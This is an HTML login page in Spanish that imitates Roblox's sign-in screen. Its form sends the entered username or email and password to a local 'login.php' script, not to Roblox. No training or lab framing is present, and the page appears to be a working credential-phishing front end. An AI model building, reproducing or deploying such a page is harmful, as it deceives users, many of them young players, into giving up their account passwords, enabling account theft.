<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicia sesión - Roblox</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: #16213e;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            text-align: center;
            width: 300px;
        }
        .login-box h2 {
            color: #fff;
            margin-bottom: 20px;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background: #0f3460;
            color: #fff;
            font-size: 14px;
        }
        .login-box button {
            width: 100%;
            padding: 10px;
            background: #e94560;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-box button:hover {
            background: #c73e54;
        }
        .login-box p {
            color: #aaa;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Inicia sesión en Roblox</h2>
        <form action="login.php" method="POST">
            <input type="text" name="username" placeholder="Usuario / Email" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
        <p>¿No tienes cuenta? <a href="#" style="color:#e94560;">Regístrate</a></p>
    </div>
</body>
</html>
